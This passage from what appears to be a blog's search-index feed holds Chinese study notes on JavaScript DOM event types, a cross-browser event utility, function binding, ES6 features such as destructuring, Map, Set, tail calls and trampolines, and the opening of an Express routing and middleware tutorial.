class="headerlink" title="事件类型"></a>事件类型</h4><ul><li>UI事件<ul><li>load：当页面完全加载后（包括所有图像，js文件，css文件等外部资源），就会触发window上面的load事件</li><li>unload：常用于清除引用，以避免内存泄露</li><li>resize：浏览器窗口大小变化时触发</li><li>scroll：window对象上发生的</li></ul></li><li>焦点事件<ul><li>blur：不会冒泡，在元素失去焦点时触发</li><li>focus：元素获得焦点时触发，不会冒泡</li><li>focusin：元素获得焦点时触发，会冒泡</li><li>focusout：元素失去焦点时会触发</li></ul></li><li>鼠标与滚轮事件<ul><li>mousedown：用户按下任意鼠标按钮</li><li>mouseup：用户释放鼠标按钮</li><li>click：单击鼠标或回车触发</li><li>dbclick：双击鼠标触发</li><li>mouseenter：鼠标从元素外部首次移动到元素范围内触发，<strong>不冒泡</strong></li><li>mouseleave：位于元素上方的鼠标移动到元素范围之外触发，<strong>不冒泡</strong></li><li>mousemove：鼠标在元素内部移动时重复地触发</li><li>mouseout：位于元素上方的鼠标移入到另一个元素触发，可能是外部元素也可能是后代元素</li><li>mouseover：位于元素外部的鼠标首次移入另一个元素边界之内触发</li><li>区别：由于mouseenter/mouseleave不支持事件冒泡，导致在一个元素的子元素上进入或离开的时候会触发其mouseover和mouseout事件，但是却不会触发mouseenter和mouseleave事件</li><li>(event.clientX, event.clientY)：事件发生时鼠标指针在视口的水平和垂直坐标</li><li>(event.pageX, event.pageY)：事件发生时鼠标指针在页面的水平和垂直坐标；页面没有滚动的情况下与客户区坐标的值相等</li><li>(screenX, screenY)：事件发生时鼠标指针在屏幕的水平和垂直坐标</li></ul></li><li>键盘与文本事件<ul><li>keydown：按下键盘的任意触发，按住不放反复触发</li><li>keypress：按下键盘的字符键/Esc触发，按住不放反复触发</li><li>keyup：释放键盘上的键时触发</li></ul></li><li>HTML5事件<ul><li>contextmenu事件，单击鼠标邮件调出上下文</li><li>beforeunload事件</li><li>DOMContentLoaded事件：形成完整的DOM树后触发，不理会图像、脚本、样式表等其他问价是否下载完</li><li>readystatechange事件，加载状态，document.readyState可能的值：<ul><li>uninitialized</li><li>loading</li><li>loaded</li><li>interactive</li><li>complete</li></ul></li><li>hashchange：URL参数列表及#后字符串变化时触发</li></ul></li></ul><h4 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h4><ul><li>内存和性能：JS中添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能。原因是多方面的：① 每个函数都是对象，会占用内存；内存中的对象越多，性能越差；② 必须实现指定所有的事件处理程序而导致的DOM访问次数，会延迟整个页面的交互就绪时间；</li><li>事件委托利用了事件冒泡，只指定一个事件处理程序，就可以管理某个类型的所有事件</li></ul><h4 id="一个通用的跨浏览器事件函数"><a href="#一个通用的跨浏览器事件函数" class="headerlink" title="一个通用的跨浏览器事件函数"></a>一个通用的跨浏览器事件函数</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> EventUtil<span class="token operator">=</span><span class="token punctuation">{</span>   addHandler<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//添加事件</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>addEventListener<span class="token punctuation">)</span><span class="token punctuation">{</span>         element<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//使用DOM2级方法添加事件</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>attachEvent<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//使用IE方法添加事件</span>         element<span class="token punctuation">.</span><span class="token function">attachEvent</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token operator">+</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         element<span class="token punctuation">[</span><span class="token string">"on"</span><span class="token operator">+</span>type<span class="token punctuation">]</span><span class="token operator">=</span>handler<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用DOM0级方法添加事件</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>     removeHandler<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//取消事件</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>removeEventListener<span class="token punctuation">)</span><span class="token punctuation">{</span>         element<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>detachEvent<span class="token punctuation">)</span><span class="token punctuation">{</span>         element<span class="token punctuation">.</span><span class="token function">detachEvent</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token operator">+</span>type<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         element<span class="token punctuation">[</span><span class="token string">"on"</span><span class="token operator">+</span>type<span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getEvent<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//使用这个方法跨浏览器取得event对象</span>      <span class="token keyword">return</span> event<span class="token operator">?</span>event<span class="token punctuation">:</span>window<span class="token punctuation">.</span>event<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getTarget<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//返回事件的实际目标</span>      <span class="token keyword">return</span> event<span class="token punctuation">.</span>target<span class="token operator">||</span>event<span class="token punctuation">.</span>srcElement<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   preventDefault<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//阻止事件的默认行为</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>preventDefault<span class="token punctuation">)</span><span class="token punctuation">{</span>         event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         event<span class="token punctuation">.</span>returnValue<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   stopPropagation<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//立即停止事件在DOM中的传播</span>     <span class="token comment" spellcheck="true">//避免触发注册在document.body上面的事件处理程序</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>stopPropagation<span class="token punctuation">)</span><span class="token punctuation">{</span>         event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         event<span class="token punctuation">.</span>cancelBubble<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getRelatedTarget<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//获取mouseover和mouseout相关元素</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>relatedTarget<span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>relatedTarget<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>toElement<span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//兼容IE8-</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>toElement<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>formElement<span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>formElement<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getButton<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取mousedown或mouseup按下或释放的按钮是鼠标中的哪一个</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">hasFeature</span><span class="token punctuation">(</span><span class="token string">"MouseEvents"</span><span class="token punctuation">,</span><span class="token string">"2.0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>button<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">switch</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>button<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//将IE模型下的button属性映射为DOM模型下的button属性</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//按下的是鼠标主按钮（一般是左键）</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//按下的是中间的鼠标按钮</span>            <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//鼠标次按钮（一般是右键）</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getWheelDelta<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//获取表示鼠标滚轮滚动方向的数值</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>wheelDelta<span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>wheelDelta<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token operator">-</span>event<span class="token punctuation">.</span>detail<span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">,</span>   getCharCode<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//以跨浏览器取得相同的字符编码，需在keypress事件中使用</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> event<span class="token punctuation">.</span>charCode<span class="token operator">==</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>charCode<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">return</span> event<span class="token punctuation">.</span>keyCode<span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="函数绑定"><a href="#函数绑定" class="headerlink" title="函数绑定"></a>函数绑定</h4><ul><li>函数绑定要创建一个函数，可以在特定的this环境中以指定参数调用另一个函数。该技巧常常和回调函数与事件处理程序一起使用，以便在将函数作为变量传递的同时保留代码执行环境。<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> handler <span class="token operator">=</span> <span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"Event handled"</span><span class="token punctuation">,</span>handleClick<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myButton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>btn<span class="token punctuation">,</span> <span class="token string">"click"</span><span class="token punctuation">,</span> handler<span class="token punctuation">.</span>handleClick<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//undefined</span><span class="token comment" spellcheck="true">// 改进，使用闭包</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>btn<span class="token punctuation">,</span> <span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>handler<span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// bind函数</span><span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>btn<span class="token punctuation">,</span> <span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token function">bind</span><span class="token punctuation">(</span>handleClick<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ES5原生</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>btn<span class="token punctuation">,</span> <span class="token string">"click"</span><span class="token punctuation">,</span> handler<span class="token punctuation">.</span>handleClick<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 事件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript6新特性</title>
      <link href="/2018/09/30/ecmascript6-xin-te-xing/"/>
      <url>/2018/09/30/ecmascript6-xin-te-xing/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="http://es6.ruanyifeng.com" target="_blank" rel="noopener">ECMAScript 6 入门</a></li><li><a href="http://es6-features.org" target="_blank" rel="noopener">ECMAScript 6 vs ECMAScript 5</a></li></ul><h4 id="ES6新增的编程风格"><a href="#ES6新增的编程风格" class="headerlink" title="ES6新增的编程风格"></a>ES6新增的编程风格</h4><ul><li>let 块级作用域和const 全局常量<ul><li>var命令存在变量提升效用，let命令没有这个问题</li><li>const 考虑到全局环境、变量值不变和线程安全</li></ul></li><li>字符串<ul><li>静态字符串一律用单引号</li><li>动态字符串用反引号</li><li>字符串遍历接口<code>for ... of</code></li><li><code>includes()</code>、<code>startsWith()</code>、<code>endsWith()</code>确定一个字符串是否包含在另一个字符串中</li><li><code>repeat()</code>：返回一个新字符串，将原字符串重复整数n次(n为正数，小数会取整)<pre class=" language-Javascript"><code class="language-Javascript">const a = "foobar";const b = `foo${a}bar`;//"foofoobarbar"let text = String.fromCodePoint(0x20BB7);for (let i = 0; i < text.length; i++) {console.log(text[i]);//" " " " 不是期望的结果，将中文识别成两个字符}for(let i of text) {console.log(i); //"𠮷"}'x'.repeat(3);//'xxx''na'.repeat(0);//''</code></pre></li></ul></li><li>解析构值<ul><li>使用数组成员对变量赋值时，优先使用解构赋值<code>const [first, second] = arr;</code></li><li>函数的参数如果是对象的成员，优先使用解构赋值<pre class=" language-Javascript"><code class="language-Javascript">function getFullName({first, second}) {}function processInput(input) {return {left, right, top, bottom};}const {left, right} = processInput(input);//交换变量的值[x, y] = [y, x];</code></pre></li></ul></li><li>数组<ul><li>使用扩展运算符(…)拷贝数组<code>const itemCopy = [...items];</code></li><li>使用Array.from方法，将类似数组的对象转化为数组<pre class=" language-Javascript"><code class="language-Javascript">const foo = document.querySelectorAll('.foo');const nodes = Array.from(foo);</code></pre></li></ul></li><li>函数<ul><li>立即执行函数可以写成箭头函数的形式<pre class=" language-Javascript"><code class="language-Javascript">(() => {console.log('hello from Javascript')；})();[1, 2, 3].map(x => x * x);</code></pre><ul><li>箭头函数取代<code>Function.prototype.bind</code></li></ul></li><li>不要在函数体内使用<code>arguments</code>变量，使用rest运算符代替，因为rest运算符显式表明你想要获得参数，而且<code>arguments</code>是一个类似数组的对象，而rest运算符可以提供一个真正的数组。<pre class=" language-Javascript"><code class="language-Javascript">//badfunction concatenateAll(){const args = Array.prototype.slice.call(arguments);return args.join('');}//goodfunction concatenateAll(...args) {return args.join('');}</code></pre><ul><li><code>Array.prototype.slice.call(arguments)</code><ul><li>能将具有length属性的对象(key值为数字)转成数组</li><li>没有length属性返回空数组</li></ul></li></ul></li></ul></li><li>Map结构<br>只有模拟现实世界的实体对象，才使用Object。如果只是<code>key:value</code>的数据结构，使用Map结构。因为Map有内建的遍历机制。<pre class=" language-Javascript"><code class="language-Javascript">let map = new Map(arr);map.set('first', 'hello');for(let key of map.keys()) {// let [key] of mapconsole.log(key);}for(let value of map.values()){//let [, value] of mapconsole.log(value);}for(let item of map.entries()){console.log(items[0], );}for(let [key, value] of map) {console.log(key + 'is' + value);}</code></pre></li><li>Set结构<br>Set本身是一个构造函数，成员值是唯一的。接受一个数组或者具有iterable接口的其他数据结构作为参数，用来初始化。两个对象总是不相等。</li><li><strong>add(value)</strong>：返回Set结构本身</li><li><strong>delete(value)</strong>：返回布尔值，表明删除是否成功</li><li><strong>has(value)</strong>：返回布尔值，是否为Set成员</li><li><p><strong>clear()</strong>：清除所有成员，无返回值</p><pre class=" language-Javascript"><code class="language-Javascript">const s = new Set();[2, 3, 5, 4, 5, 2, 2].forEach(x => s.add(x));for(let i of s) {console.log(i);//2 3 5 4}//数组去重[...new Set(array)]</code></pre></li><li><p>Class 取代<code>prototype</code>，类似Java语法</p><pre class=" language-Javascript"><code class="language-Javascript">class Queue {constructor(contents = []) {  this._queue = [...contents];}pop() {  const value = this.queue[0];  this._queue.splice(0, 1);  return value;}}class PeekableQueue extends Queue {peek() {  return this._queue[0];}}</code></pre></li><li>模块<pre class=" language-Javascript"><code class="language-Javascript">//Javascript标准语法const React = require('react');var Breadcrumbs = React.createClass({render() {  return <nav />;}});module.exports = Breadcrumbs;// ES6语法import React from 'react';class Breadcrumbs extends React.Component {render() {  return <nav />;}};//如果模块只有一个输出值，就使用export defaultexports default Breadcrumbs;</code></pre></li><li><p>ESLint<br>ESLint是一个语法规则和代码风格的检查工具</p></li><li><p>模板字符串:模板字符串中嵌入变量，需要将变量名写在${}之中，多行字符串保留空格和缩进</p><pre class=" language-Javascript"><code class="language-Javascript">$('#result').append(`There are <b> ${basket.count} </b> items in your basket, <em> ${basket.onSale}</em> are on sale!`);</code></pre></li><li><code>Number.EPSILOW</code>：相当于2的-52次方，是JavaScript能够表示的最小精度，误差如果小于这个值，就可以认为已经没有意义了，即不存在误差。<pre class=" language-Javascript"><code class="language-Javascript">0.1+0.2// 0.300000000000000040.1 + 0.2 - 0.3// 5.551115123125783e-170.1 + 0.2 == 0.3//falsefunction withErrorMargin(left, right) {return Math.abs(left - right) < Number.EPSILOW * Math.pow(2, 2);//误差设为2的-50次方}</code></pre></li><li>函数默认参数值<ul><li>允许为函数参数设置默认值</li><li>参数默认值不是传值的，而是每次计算表达式的值</li><li>定义默认值的参数应该是函数的尾参数，否则没法省略</li></ul></li><li><p>箭头函数</p><ul><li>函数体内的this对象就是定义时所在的对象，而不是使用时所在的对象</li><li>不可以当作构造函数，也就是说不可以使用new命令，否则会抛出一个错误</li><li>不可以使用arguments对象，该对象在函数体内不存在，可以用rest参数替代</li><li>不可以用<code>yield</code>命令</li></ul></li><li><p><strong>尾调用</strong>： 某个函数的最后一步是调用另一个函数</p><pre class=" language-Javascript"><code class="language-Javascript">function f() {let m = 1;let n = 2;return g(m + n); //调用后还有其他操作，或者不返回都不是尾调用}</code></pre><ul><li>函数调用会在内存形成一个<strong>调用帧</strong>，所有调用帧会形成一个<strong>调用栈</strong>内</li><li>如果函数g不是尾调用，函数f就需要保存内部变量m和n的值、g的调用位置等信息。但由于调用g之后，函数f就结束了，所以执行到最后一步，完全可以删除f(x)的调用帧，只保留g(3)的调用帧。</li><li><strong>尾调用优化</strong>（Tail call optimization），即只保留内层函数的调用帧。如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”的意义。</li><li>只有不再用到外层函数的内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则就无法进行“尾调用优化”。</li></ul></li><li><p><strong>尾递归</strong>：函数调用自身，称为递归。如果尾调用自身，就称为尾递归。</p><ul><li>递归非常耗费内存，因为需要同时保存成千上百个调用帧，很容易发生“栈溢出”错误（stack overflow）。但对于尾递归来说，由于只存在一个调用帧，所以永远不会发生“栈溢出”错误。<pre class=" language-Javascript"><code class="language-Javascript">//非尾递归：需要保存n个调用记录，复杂度O(n)function factorial(n) {if(n == 1) return 1;return n * factorial(n - 1);}//尾递归，只保留一个调用记录，复杂度O(1)function factorial(n, total = 1) {if(n == 1) return total;return factorial(n - 1, n * total);}</code></pre></li></ul></li><li><strong>蹦床函数</strong>(trampoline)：将递归执行转为循环执行<pre class=" language-Javascript"><code class="language-Javascript">//蹦床函数function trampoline(f) {while (f && f instanceof Function) {  f = f();}return f;}//栈溢出function sum(x, y) {if(y > 0) {  return sum(x + 1, y - 1);} else {  return x;}}sum(1, 1000000);//改写返回另一个函数function sum(x, y) {if(y > 0) {  return sum.bind(null, x + 1, y - 1);} else {  return x;}}trampoline(sum(1, 100000))</code></pre></li><li>数组深度复制<pre class=" language-Javascript"><code class="language-Javascript">// ES5const a1 = [1, 2];const a2 = a1.concat();//ES6const a2 = [...a1];//或者const [...a2] = a1;</code></pre></li><li>数组合并<pre class=" language-Javascript"><code class="language-Javascript">// ES5arr1.concat(arr2, arr3);//浅拷贝//ES6[..arr1, ...arr2, ...arr3];//浅拷贝//字符串转数组[...'hello']//["h","e","l","l","o"]</code></pre></li><li><code>Object.assign</code>：方法用于对象的合并，将源对象的所有可枚举属性，复制到目标对象，方法的第一个参数是目标对象，后面的参数都是源对象。<pre class=" language-Javascript"><code class="language-Javascript">const target = { a: 1 };const source1 = { b: 2 };const source2 = { c: 3 };Object.assign(target, source1, source2); //浅拷贝，源对象值改变，会引起变化target // {a:1, b:2, c:3}//为对象添加属性class Point {constructor(x, y) {  Object.assign(this, {x, y});}}//为对象添加方法Object.assign(SomeClass.prototype, {someMethod(arg1, arg2) {  ···},anotherMethod() {  ···}});</code></pre><h4 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h4>见<a href=""></a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express基础及源码解析</title>
      <link href="/2018/09/27/express-ji-chu-ji-yuan-ma-jie-xi/"/>
      <url>/2018/09/27/express-ji-chu-ji-yuan-ma-jie-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="express是什么"><a href="#express是什么" class="headerlink" title="express是什么"></a>express是什么</h4><p>Express是基于Node.js平台的Web开发框架，是一个路由和中间件 Web 框架，其自身只具有最低程度的功能：Express 应用程序基本上是一系列中间件函数调用。核心特性:</p><ul><li>设置中间件来响应HTTP请求</li><li>定义了路由表来执行不同的HTTP请求动作</li><li>可以通过模板传递参数来动态渲染HTML页面</li></ul><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ul><li><strong>基本路由</strong>：路由用于确定应用程序如何响应对特定端点的客户机请求，包含一个 URI（或路径）和一个特定的 HTTP 请求方法（GET、POST 等）。每个路由可以具有一个或多个处理程序函数，这些函数在路由匹配时执行。路由定义采用以下结构：<code>app.METHOD(PATH, HANDLER)</code><ul><li>app 是 express 的实例</li><li>METHOD 是 HTTP 请求方法</li><li>PATH 是服务器上的路径</li><li>HANDLER 是在路由匹配时执行的函数</li></ul></li><li><strong>中间件</strong><ul><li>中间件函数能够访问请求对象<strong>req</strong>、响应对象<strong>res</strong>以及应用程序的请求/响应循环中的下一个中间件函数。下一个中间件函数通常由名为<strong>next</strong>的变量来表示。</li><li>中间件函数可以执行以下任务：<ul><li>执行任何代码</li><li>对请求和响应对象进行更改</li><li>结束请求/响应循环</li><li>调用堆栈中的下一个中间件函数</li></ul></li><li>如果当前中间件函数没有结束请求/响应循环，那么它必须调用 next()，以将控制权传递给下一个中间件函数。否则，请求将保持挂起状态。Express 应用程序可以使用以下类型的中间件：<ul><li>应用层中间件</li><li>路由器层中间件</li><li>错误处理中间件</li><li>内置中间件</li><li>第三方中间件</li></ul></li><li>使用 express.Router 类来创建可安装的模块化路由处理程序。Router 实例是完整的中间件和路由系统；因此，常常将其称为“微型应用程序”。以下示例将路由器创建为模块，在其中装入中间件，定义一些路由，然后安装在主应用程序的路径中。在应用程序目录中创建名为 birds.js 的路由器文件，其中包含以下内容：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// middleware that is specific to this router</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">timeLog</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Time: '</span><span class="token punctuation">,</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// define the home page route</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Birds home page'</span><span class="token 